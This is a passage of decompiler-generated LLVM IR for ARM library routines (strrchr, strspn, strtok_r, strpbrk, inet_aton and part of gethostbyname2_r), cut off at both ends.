  store i32 %v1_140d0, i32* @r4, align 4
  br i1 %v2_140c8, label %dec_label_pc_140d8, label %dec_label_pc_140b4

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140c0, %dec_label_pc_140b4, %entry
  %v0_140d8 = phi i32 [ 0, %entry ], [ %v0_140c0, %dec_label_pc_140b4 ], [ %v1_140c0, %dec_label_pc_140c0 ]
  %v2_140dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_140dc, i32* @r4, align 4
  store i32 %v6_140a0, i32* @r5, align 4
  store i32 %v9_140a0, i32* @r6, align 4
  ret i32 %v0_140d8

; uselistorder directives
  uselistorder i32 %v3_140c4, { 1, 0 }
  uselistorder i32 %v0_140cc.pre, { 1, 0 }
  uselistorder i32 %v0_140c4.pre, { 1, 0 }
  uselistorder label %dec_label_pc_140b4, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_140e8 = urem i32 %arg2, 256
  store i32 %v1_140e8, i32* @r4, align 4
  %v2_140e8 = icmp eq i32 %v1_140e8, 0
  br i1 %v2_140e8, label %dec_label_pc_140fc, label %dec_label_pc_14110.preheader

dec_label_pc_14110.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_141183 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_140e8)
  %v2_1411c5 = icmp eq i32 %v2_141183, 0
  br i1 %v2_1411c5, label %dec_label_pc_14124, label %dec_label_pc_14108

dec_label_pc_140fc:                               ; preds = %entry
  %v2_14100 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_14128

dec_label_pc_14108:                               ; preds = %dec_label_pc_14110.preheader, %dec_label_pc_14108
  %v2_141186 = phi i32 [ %v2_14118, %dec_label_pc_14108 ], [ %v2_141183, %dec_label_pc_14110.preheader ]
  store i32 %v2_141186, i32* @r5, align 4
  %v1_1410c = add i32 %v2_141186, 1
  store i32 %v1_1410c, i32* @r0, align 4
  %v0_14114 = load i32, i32* @r4, align 4
  %v2_14118 = call i32 @__GI_strchr(i32 %v1_1410c, i32 %v0_14114)
  %v2_1411c = icmp eq i32 %v2_14118, 0
  br i1 %v2_1411c, label %dec_label_pc_14124, label %dec_label_pc_14108

dec_label_pc_14124:                               ; preds = %dec_label_pc_14108, %dec_label_pc_14110.preheader
  %v0_14124 = load i32, i32* @r5, align 4
  br label %dec_label_pc_14128

dec_label_pc_14128:                               ; preds = %dec_label_pc_140fc, %dec_label_pc_14124
  %storemerge = phi i32 [ %v2_14100, %dec_label_pc_140fc ], [ %v0_14124, %dec_label_pc_14124 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_14118, { 1, 0 }
  uselistorder i32 %v1_1410c, { 1, 0 }
  uselistorder i32 %v1_140e8, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_14128, { 1, 0 }
  uselistorder label %dec_label_pc_14108, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_141642 = load i32, i32* @r0, align 4
  %v1_141643 = inttoptr i32 %v0_141642 to i8*
  %v2_141644 = load i8, i8* %v1_141643, align 1
  %v3_141645 = zext i8 %v2_141644 to i32
  store i32 %v3_141645, i32* @ip, align 4
  %v2_141686 = icmp eq i8 %v2_141644, 0
  br i1 %v2_141686, label %dec_label_pc_14174, label %dec_label_pc_14148.preheader

dec_label_pc_14140:                               ; preds = %dec_label_pc_14148
  %v3_14148 = zext i8 %v2_14148 to i32
  %v1_14150 = add i32 %v0_14150, 1
  %v9_14140 = icmp eq i32 %v0_1414010, %v3_14148
  br i1 %v9_14140, label %dec_label_pc_1415c, label %dec_label_pc_14148

dec_label_pc_14148:                               ; preds = %dec_label_pc_14148.preheader, %dec_label_pc_14140
  %v0_14150 = phi i32 [ %tmp, %dec_label_pc_14148.preheader ], [ %v1_14150, %dec_label_pc_14140 ]
  %v1_14148 = inttoptr i32 %v0_14150 to i8*
  %v2_14148 = load i8, i8* %v1_14148, align 1
  %v2_1414c = icmp eq i8 %v2_14148, 0
  br i1 %v2_1414c, label %dec_label_pc_14174, label %dec_label_pc_14140

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14140
  %v1_1415c = add i32 %v0_1415c, 1
  %v1_14160 = add i32 %v0_14160, 1
  %v1_14164 = inttoptr i32 %v1_14160 to i8*
  %v2_14164 = load i8, i8* %v1_14164, align 1
  %v3_14164 = zext i8 %v2_14164 to i32
  store i32 %v3_14164, i32* @ip, align 4
  %v2_14168 = icmp eq i8 %v2_14164, 0
  br i1 %v2_14168, label %dec_label_pc_14174, label %dec_label_pc_14148.preheader

dec_label_pc_14148.preheader:                     ; preds = %entry, %dec_label_pc_1415c
  %v0_14160 = phi i32 [ %v1_14160, %dec_label_pc_1415c ], [ %v0_141642, %entry ]
  %v0_1415c = phi i32 [ %v1_1415c, %dec_label_pc_1415c ], [ 0, %entry ]
  %v0_1414010 = phi i32 [ %v3_14164, %dec_label_pc_1415c ], [ %v3_141645, %entry ]
  br label %dec_label_pc_14148

dec_label_pc_14174:                               ; preds = %dec_label_pc_1415c, %dec_label_pc_14148, %entry
  %v0_14174 = phi i32 [ 0, %entry ], [ %v0_1415c, %dec_label_pc_14148 ], [ %v1_1415c, %dec_label_pc_1415c ]
  ret i32 %v0_14174

; uselistorder directives
  uselistorder i32 %v0_14150, { 1, 0 }
  uselistorder label %dec_label_pc_14148.preheader, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14180 = load i32, i32* @r4, align 4
  store i32 %v3_14180, i32* %stack_var_-16, align 4
  %v0_14184 = load i32, i32* @r0, align 4
  store i32 %v0_14184, i32* %r4.global-to-local, align 4
  %v2_14184 = icmp eq i32 %v0_14184, 0
  %v1_14188 = load i32, i32* @r2, align 4
  br i1 %v2_14184, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_14188 = inttoptr i32 %v1_14188 to i32*
  %v3_14188 = load i32, i32* %v2_14188, align 4
  store i32 %v3_14188, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1418c = phi i32 [ %v3_14188, %bb ], [ %v0_14184, %entry ]
  store i32 %v0_1418c, i32* @r0, align 4
  store i32 %v1_14188, i32* %r5.global-to-local, align 4
  %v0_14194 = load i32, i32* @r1, align 4
  store i32 %v0_14194, i32* %r6.global-to-local, align 4
  %v1_14198 = inttoptr i32 %v0_1418c to i8*
  %v2_14198 = call i32 @__GI_strspn(i8* %v1_14198)
  %v0_1419c = load i32, i32* %r4.global-to-local, align 4
  %v2_1419c = add i32 %v0_1419c, %v2_14198
  %v3_1419c = inttoptr i32 %v2_1419c to i8*
  %v4_1419c = load i8, i8* %v3_1419c, align 1
  %v6_1419c = zext i8 %v4_1419c to i32
  store i32 %v6_1419c, i32* %r3.global-to-local, align 4
  store i32 %v2_1419c, i32* @r4, align 4
  %v2_141a4 = icmp eq i8 %v4_1419c, 0
  br i1 %v2_141a4, label %bb8, label %dec_label_pc_141b0

bb8:                                              ; preds = %entry._crit_edge
  %v2_141a8 = load i32, i32* %r5.global-to-local, align 4
  %v3_141a8 = inttoptr i32 %v2_141a8 to i32*
  store i32 %v2_1419c, i32* %v3_141a8, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141b0:                               ; preds = %entry._crit_edge
  %v0_141b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_141b8 = call i32 @__GI_strpbrk(i8* %v3_1419c, i32 %v0_141b0)
  %v3_141bc = icmp eq i32 %v3_141b8, 0
  br i1 %v3_141bc, label %dec_label_pc_141c4, label %dec_label_pc_141dc

dec_label_pc_141c4:                               ; preds = %dec_label_pc_141b0
  %v0_141c8 = load i32, i32* @r4, align 4
  store i32 %v0_141c8, i32* @r0, align 4
  %v2_141cc = call i32 @rawmemchr(i32 %v0_141c8, i32 0)
  %v0_141d0 = load i32, i32* @r4, align 4
  store i32 %v0_141d0, i32* %r3.global-to-local, align 4
  %v1_141d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_141d4 = inttoptr i32 %v1_141d4 to i32*
  store i32 %v2_141cc, i32* %v2_141d4, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141dc:                               ; preds = %dec_label_pc_141b0
  %v4_141b8 = inttoptr i32 %v3_141b8 to i8*
  store i8 0, i8* %v4_141b8, align 1
  %v7_141e0 = add i32 %v3_141b8, 1
  %v1_141e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_141e4 = inttoptr i32 %v1_141e4 to i32*
  store i32 %v7_141e0, i32* %v2_141e4, align 4
  %v0_141e8 = load i32, i32* @r4, align 4
  store i32 %v0_141e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %bb8, %dec_label_pc_141c4, %dec_label_pc_141dc
  %v0_141ec = load i32, i32* %r3.global-to-local, align 4
  %v2_141f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_141f0, i32* @r4, align 4
  ret i32 %v0_141ec

; uselistorder directives
  uselistorder i32 %v3_141b8, { 0, 2, 1 }
  uselistorder i32 %v0_1418c, { 1, 0 }
  uselistorder i32 %v0_14184, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_141ec, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14224

dec_label_pc_14200:                               ; preds = %dec_label_pc_14210
  %v3_14210 = zext i8 %v2_14210 to i32
  %v1_14218 = add i32 %v0_14218, 1
  %v1_14200 = load i32, i32* %r0.global-to-local, align 4
  %v9_14200 = icmp eq i32 %v3_14210, %v1_14200
  br i1 %v9_14200, label %dec_label_pc_14208, label %dec_label_pc_14210

dec_label_pc_14208:                               ; preds = %dec_label_pc_14200
  %v0_14208 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_14208, i32* %r0.global-to-local, align 4
  ret i32 %v0_14208

dec_label_pc_14210:                               ; preds = %dec_label_pc_14200, %dec_label_pc_14224
  %v0_14218 = phi i32 [ %v1_14218, %dec_label_pc_14200 ], [ %arg2, %dec_label_pc_14224 ]
  %v1_14210 = inttoptr i32 %v0_14218 to i8*
  %v2_14210 = load i8, i8* %v1_14210, align 1
  %v2_14214 = icmp eq i8 %v2_14210, 0
  br i1 %v2_14214, label %dec_label_pc_14220, label %dec_label_pc_14200

dec_label_pc_14220:                               ; preds = %dec_label_pc_14210
  %v0_14220 = load i32, i32* %r2.global-to-local, align 4
  %v1_14220 = add i32 %v0_14220, 1
  br label %dec_label_pc_14224

dec_label_pc_14224:                               ; preds = %entry, %dec_label_pc_14220
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_14220, %dec_label_pc_14220 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14224 = inttoptr i32 %storemerge to i8*
  %v2_14224 = load i8, i8* %v1_14224, align 1
  %v3_14224 = zext i8 %v2_14224 to i32
  store i32 %v3_14224, i32* %r0.global-to-local, align 4
  %v2_14228 = icmp eq i8 %v2_14224, 0
  %v0_1422c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14228, i32 %v0_1422c)
  br label %dec_label_pc_14210

; uselistorder directives
  uselistorder i32 %v0_14218, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_14224, { 1, 0 }
  uselistorder label %dec_label_pc_14210, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14238 = load i32, i32* @r4, align 4
  store i32 %v3_14238, i32* %stack_var_-28, align 4
  %v0_14240 = load i32, i32* %r0.global-to-local, align 4
  %v2_14240 = icmp eq i32 %v0_14240, 0
  br i1 %v2_14240, label %dec_label_pc_1431c, label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %entry
  br label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %dec_label_pc_14250, %dec_label_pc_142e0
  %v1_142e0 = phi i32 [ 0, %dec_label_pc_14250 ], [ %v5_142e0, %dec_label_pc_142e0 ]
  %v0_142e4 = phi i32 [ 1, %dec_label_pc_14250 ], [ %v1_142e4, %dec_label_pc_142e0 ]
  %v0_14268 = phi i32 [ %v0_14240, %dec_label_pc_14250 ], [ %v0_1426812, %dec_label_pc_142e0 ]
  %v1_14268 = inttoptr i32 %v0_14268 to i8*
  %v2_14268 = load i8, i8* %v1_14268, align 1
  %v3_14268 = zext i8 %v2_14268 to i32
  %v4_1426c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 800) to i32*), align 4
  %v2_14270 = mul nuw nsw i32 %v3_14268, 2
  %v2_14274 = add i32 %v2_14270, %v4_1426c
  %v3_14274 = inttoptr i32 %v2_14274 to i16*
  %v4_14274 = load i16, i16* %v3_14274, align 2
  %v1_14278 = and i16 %v4_14274, 8
  %v2_14278 = icmp eq i16 %v1_14278, 0
  br i1 %v2_14278, label %dec_label_pc_1431c, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14268
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_142a0

dec_label_pc_14288:                               ; preds = %dec_label_pc_142a0
  %v2_14288 = mul i32 %v0_142e0, 10
  %v1_1428c = add i32 %v2_14288, -48
  %v2_14290 = add i32 %v3_142a0, %v1_1428c
  store i32 %v2_14290, i32* @ip, align 4
  %v8_14298 = icmp sgt i32 %v2_14290, 255
  br i1 %v8_14298, label %dec_label_pc_1431c, label %dec_label_pc_1429c

dec_label_pc_1429c:                               ; preds = %dec_label_pc_14288
  %v1_1429c = add i32 %v0_142d0, 1
  store i32 %v1_1429c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142a0

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14280, %dec_label_pc_1429c
  %v0_142e0 = phi i32 [ 0, %dec_label_pc_14280 ], [ %v2_14290, %dec_label_pc_1429c ]
  %v0_142d0 = phi i32 [ %v0_14268, %dec_label_pc_14280 ], [ %v1_1429c, %dec_label_pc_1429c ]
  %v1_142a0 = inttoptr i32 %v0_142d0 to i8*
  %v2_142a0 = load i8, i8* %v1_142a0, align 1
  %v3_142a0 = zext i8 %v2_142a0 to i32
  %v2_142a4 = mul nuw nsw i32 %v3_142a0, 2
  %v2_142a8 = add i32 %v2_142a4, %v4_1426c
  %v3_142a8 = inttoptr i32 %v2_142a8 to i16*
  %v4_142a8 = load i16, i16* %v3_142a8, align 2
  %v6_142a8 = zext i16 %v4_142a8 to i32
  %v1_142ac = and i32 %v6_142a8, 8
  %v2_142ac = icmp eq i32 %v1_142ac, 0
  br i1 %v2_142ac, label %dec_label_pc_142b4, label %dec_label_pc_14288

dec_label_pc_142b4:                               ; preds = %dec_label_pc_142a0
  %v7_142b4 = icmp eq i32 %v0_142e4, 4
  br i1 %v7_142b4, label %dec_label_pc_142cc, label %dec_label_pc_142bc

dec_label_pc_142bc:                               ; preds = %dec_label_pc_142b4
  %v7_142bc = icmp eq i8 %v2_142a0, 46
  br i1 %v7_142bc, label %dec_label_pc_142c4, label %dec_label_pc_1431c

dec_label_pc_142c4:                               ; preds = %dec_label_pc_142bc
  %v1_142c4 = add i32 %v0_142d0, 1
  store i32 %v1_142c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142e0

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142b4
  %v2_142cc = icmp eq i8 %v2_142a0, 0
  %v1_142d0 = add i32 %v0_142d0, 1
  store i32 %v1_142d0, i32* %r0.global-to-local, align 4
  br i1 %v2_142cc, label %dec_label_pc_142e0, label %dec_label_pc_142d8

dec_label_pc_142d8:                               ; preds = %dec_label_pc_142cc
  %v1_142d8 = and i32 %v6_142a8, 32
  %v2_142d8 = icmp eq i32 %v1_142d8, 0
  br i1 %v2_142d8, label %dec_label_pc_1431c, label %dec_label_pc_142e0

dec_label_pc_142e0:                               ; preds = %dec_label_pc_142d8, %dec_label_pc_142cc, %dec_label_pc_142c4
  %v0_1426812 = phi i32 [ %v1_142d0, %dec_label_pc_142d8 ], [ %v1_142d0, %dec_label_pc_142cc ], [ %v1_142c4, %dec_label_pc_142c4 ]
  %v4_142e0 = mul i32 %v1_142e0, 256
  %v5_142e0 = or i32 %v0_142e0, %v4_142e0
  %v1_142e4 = add nuw nsw i32 %v0_142e4, 1
  %v7_142ec = icmp slt i32 %v1_142e4, 5
  br i1 %v7_142ec, label %dec_label_pc_14268, label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %dec_label_pc_142e0
  %v2_142f0 = icmp eq i32 %arg2, 0
  br i1 %v2_142f0, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_142f0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14320

bb:                                               ; preds = %dec_label_pc_142f0
  %v4_142f4 = udiv i32 %v5_142e0, 16777216
  %v2_142f8 = udiv i32 %v5_142e0, 256
  %v5_142fc = and i32 %v2_142f8, 65280
  %v2_14300 = and i32 %v5_142e0, 65280
  %v5_14304 = mul nuw nsw i32 %v2_14300, 256
  %v5_14308 = mul i32 %v0_142e0, 16777216
  %v6_142fc = or i32 %v4_142f4, %v5_14308
  %v6_14304 = or i32 %v6_142fc, %v5_142fc
  %v6_14308 = or i32 %v6_14304, %v5_14304
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_14314 = inttoptr i32 %arg2 to i32*
  store i32 %v6_14308, i32* %v3_14314, align 4
  %v2_14320.pre = load i32, i32* %stack_var_-28, align 4
  %v1_14324.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14320

dec_label_pc_1431c:                               ; preds = %dec_label_pc_142bc, %dec_label_pc_142d8, %dec_label_pc_14268, %dec_label_pc_14288, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14320

dec_label_pc_14320:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1431c
  %v1_14324 = phi i32 [ %v1_14324.pre, %bb ], [ 0, %dec_label_pc_1431c ], [ 1, %.thread7.thread ]
  %v2_14320 = phi i32 [ %v2_14320.pre, %bb ], [ %v3_14238, %dec_label_pc_1431c ], [ %v3_14238, %.thread7.thread ]
  store i32 %v2_14320, i32* @r4, align 4
  ret i32 %v1_14324

; uselistorder directives
  uselistorder i32 %v1_142e4, { 1, 0 }
  uselistorder i32 %v5_142e0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_142d0, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14320, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1431c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_142a0, { 1, 0 }
  uselistorder label %dec_label_pc_14268, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp24, i32* %stack_var_0, align 4
  %v6_14330 = load i32, i32* @r5, align 4
  %v9_14330 = load i32, i32* @r6, align 4
  %v12_14330 = load i32, i32* @r7, align 4
  %v15_14330 = load i32, i32* @r8, align 4
  %v18_14330 = load i32, i32* @sb, align 4
  %v21_14330 = load i32, i32* @sl, align 4
  %v24_14330 = load i32, i32* @fp, align 4
  %v0_14334 = load i32, i32* @r1, align 4
  %v7_14334 = icmp eq i32 %v0_14334, 2
  store i32 %arg1, i32* @sb, align 4
  %v0_14340 = load i32, i32* @r2, align 4
  store i32 %v0_14340, i32* @r7, align 4
  %v0_14344 = load i32, i32* @r3, align 4
  store i32 %v0_14344, i32* @r8, align 4
  br i1 %v7_14334, label %dec_label_pc_14350, label %dec_label_pc_14370

dec_label_pc_14350:                               ; preds = %entry
  store i32 %tmp12, i32* @ip, align 4
  store i32 %v0_14340, i32* @r1, align 4
  store i32 %v0_14344, i32* @r2, align 4
  store i32 %tmp24, i32* @r3, align 4
  %v0_14368 = call i32 @gethostbyname_r()
  store i32 %v0_14368, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145e4

dec_label_pc_14370:                               ; preds = %entry
  store i32 0, i32* @sl, align 4
  %v7_14378 = icmp eq i32 %v0_14334, 10
  %v2_1437c = inttoptr i32 %tmp12 to i32*
  store i32 0, i32* %v2_1437c, align 4
  br i1 %v7_14378, label %dec_label_pc_14384, label %dec_label_pc_145e0

dec_label_pc_14384:                               ; preds = %dec_label_pc_14370
  %v1_14384 = load i32, i32* @sl, align 4
  %v9_14384 = icmp eq i32 %v1_14384, %arg1
  br i1 %v9_14384, label %dec_label_pc_145e0, label %dec_label_pc_1438c

dec_label_pc_1438c:                               ; preds = %dec_label_pc_14384
  %v0_14394 = call i32 @__aeabi_read_tp()
  store i32 %v0_14394, i32* %r0.global-to-local, align 4
  %v3_14398 = load i16, i16* @global_var_23164.175, align 2
  %v4_14398 = sext i16 %v3_14398 to i32
  store i32 %v4_14398, i32* @r5, align 4
  store i32 %tmp12, i32* @lr, align 4
  %v2_143a8 = add i32 %v4_14398, %v0_14394
  %v3_143a8 = inttoptr i32 %v2_143a8 to i32*
  %v4_143a8 = load i32, i32* %v3_143a8, align 4
  store i32 %v4_143a8, i32* @r4, align 4
  store i32 %v0_14394, i32* @r6, align 4
  %v0_143b0 = load i32, i32* @sl, align 4
  store i32 %v0_143b0, i32* %v3_143a8, align 4
  %v0_143b4 = load i32, i32* @sb, align 4
  store i32 %v0_143b4, i32* %r0.global-to-local, align 4
  %v1_143c0 = call i32 @__get_hosts_byname_r(i32 %v0_143b4)
  store i32 %v1_143c0, i32* %r0.global-to-local, align 4
  %v2_143c4 = icmp eq i32 %v1_143c0, 0
  br i1 %v2_143c4, label %.thread1, label %dec_label_pc_143d8

.thread1:                                         ; preds = %dec_label_pc_1438c
  %v4_143cc = load i16, i16* @global_var_23164.175, align 2
  %v5_143cc = sext i16 %v4_143cc to i32
  store i32 %v5_143cc, i32* %r3.global-to-local, align 4
  %v1_143d0 = load i32, i32* @r4, align 4
  %v2_143d0 = load i32, i32* @r6, align 4
  %v4_143d0 = add i32 %v2_143d0, %v5_143cc
  %v5_143d0 = inttoptr i32 %v4_143d0 to i32*
  store i32 %v1_143d0, i32* %v5_143d0, align 4
  br label %dec_label_pc_145e4

dec_label_pc_143d8:                               ; preds = %dec_label_pc_1438c
  %v0_143d8 = load i32, i32* @fp, align 4
  %v1_143d8 = inttoptr i32 %v0_143d8 to i32*
  %v2_143d8 = load i32, i32* %v1_143d8, align 4
  store i32 %v2_143d8, i32* %r3.global-to-local, align 4
  %v7_143dc = icmp eq i32 %v2_143d8, 1
  br i1 %v7_143dc, label %dec_label_pc_143f8, label %dec_label_pc_143e4

dec_label_pc_143e4:                               ; preds = %dec_label_pc_143d8
  %v7_143e4 = icmp eq i32 %v2_143d8, 4
  br i1 %v7_143e4, label %dec_label_pc_1441c, label %dec_label_pc_143ec

dec_label_pc_143ec:                               ; preds = %dec_label_pc_143e4
  %v3_143ec = icmp eq i32 %v2_143d8, -1
  br i1 %v3_143ec, label %dec_label_pc_14408, label %dec_label_pc_145e4

dec_label_pc_143f8:                               ; preds = %dec_label_pc_143d8
  %v7_143f8 = icmp eq i32 %v1_143c0, 2
  br i1 %v7_143f8, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_143f8
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_14420

.thread3:                                         ; preds = %dec_label_pc_143f8
  store i32 1, i32* @r6, align 4
  br label %dec_label_pc_14420

dec_label_pc_14408:                               ; preds = %dec_label_pc_143ec
  %v3_1440c = load i16, i16* @global_var_23164.175, align 2
  %v4_1440c = sext i16 %v3_1440c to i32
  store i32 %v4_1440c, i32* %r3.global-to-local, align 4
  %v0_14410 = load i32, i32* @r6, align 4
  %v2_14410 = add i32 %v0_14410, %v4_1440c
  %v3_14410 = inttoptr i32 %v2_14410 to i32*
  %v4_14410 = load i32, i32* %v3_14410, align 4
  store i32 %v4_14410, i32* %r3.global-to-local, align 4
  %v7_14414 = icmp eq i32 %v4_14410, 2
  br i1 %v7_14414, label %dec_label_pc_1441c, label %dec_label_pc_145e4

dec_label_pc_1441c:                               ; preds = %dec_label_pc_14408, %dec_label_pc_143e4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_14420

dec_label_pc_14420:                               ; preds = %bb, %.thread3, %dec_label_pc_1441c
  %v3_14420 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_14420, i32* %r0.global-to-local, align 4
  %v0_14424 = load i32, i32* @r8, align 4
  %v1_14424 = sub i32 0, %v0_14424
  %v1_14428 = urem i32 %v1_14424, 4
  store i32 %v1_14428, i32* @r1, align 4
  %v2_14430 = sub i32 %v3_14420, %v1_14428
  store i32 %v2_14430, i32* %r2.global-to-local, align 4
  %v3_14434 = load i16, i16* @global_var_23164.175, align 2
  %v4_14434 = sext i16 %v3_14434 to i32
  store i32 %v4_14434, i32* %r3.global-to-local, align 4
  %v0_14438 = call i32 @__aeabi_read_tp()
  store i32 %v0_14438, i32* %r0.global-to-local, align 4
  %v1_1443c = add i32 %v2_14430, -24
  store i32 %v1_1443c, i32* @sl, align 4
  %v0_14440 = load i32, i32* @r4, align 4
  %v3_14440 = add i32 %v4_14434, %v0_14438
  %v4_14440 = inttoptr i32 %v3_14440 to i32*
  store i32 %v0_14440, i32* %v4_14440, align 4
  %v0_14444 = load i32, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1444c = load i32, i32* @fp, align 4
  %v2_1444c = inttoptr i32 %v1_1444c to i32*
  store i32 -1, i32* %v2_1444c, align 4
  %v7_14450 = icmp sgt i32 %v0_14444, 255
  br i1 %v7_14450, label %dec_label_pc_14458, label %bb27

bb27:                                             ; preds = %dec_label_pc_14420
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145e4

dec_label_pc_14458:                               ; preds = %dec_label_pc_14420
  %v0_14458 = load i32, i32* @r8, align 4
  %v1_14458 = load i32, i32* @r1, align 4
  %v2_14458 = add i32 %v1_14458, %v0_14458
  store i32 %v2_14458, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_14460 = add i32 %v2_14458, 16
  store i32 %v1_14460, i32* %r2.global-to-local, align 4
  %v1_14464 = add i32 %v2_14458, 24
  store i32 %v1_14464, i32* @r5, align 4
  %v3_1446c = inttoptr i32 %v1_14460 to i32*
  store i32 %v2_14458, i32* %v3_1446c, align 4
  %v0_14470 = load i32, i32* @sb, align 4
  store i32 %v0_14470, i32* @r1, align 4
  %v0_14474 = load i32, i32* @r4, align 4
  %v1_14474 = load i32, i32* %r2.global-to-local, align 4
  %v2_14474 = add i32 %v1_14474, 4
  %v3_14474 = inttoptr i32 %v2_14474 to i32*
  store i32 %v0_14474, i32* %v3_14474, align 4
  %v0_14478 = load i32, i32* @r5, align 4
  store i32 %v0_14478, i32* %r0.global-to-local, align 4
  %v0_1447c = load i32, i32* @sl, align 4
  store i32 %v0_1447c, i32* %r2.global-to-local, align 4
  %v3_14480 = call i32 @strncpy(i32 %v0_14478, i32 %v0_14470, i32 %v0_1447c)
  %v0_14484 = load i32, i32* @r4, align 4
  %v1_14484 = trunc i32 %v0_14484 to i8
  %v2_14484 = load i32, i32* @r5, align 4
  %v3_14484 = load i32, i32* @sl, align 4
  %v4_14484 = add i32 %v3_14484, %v2_14484
  %v5_14484 = inttoptr i32 %v4_14484 to i8*
  store i8 %v1_14484, i8* %v5_14484, align 1
  %v0_14488 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_14490 = load i32, i32* @r8, align 4
  store i32 %v0_14490, i32* %r2.global-to-local, align 4
  %v3_14494 = inttoptr i32 %v0_14488 to i8*
  %v4_14494 = call i32 @inet_pton(i32 10, i8* %v3_14494, i32 %v0_14490)
  store i32 %v4_14494, i32* %r0.global-to-local, align 4
  %v1_14498 = load i32, i32* @r4, align 4
  %v9_14498 = icmp eq i32 %v4_14494, %v1_14498
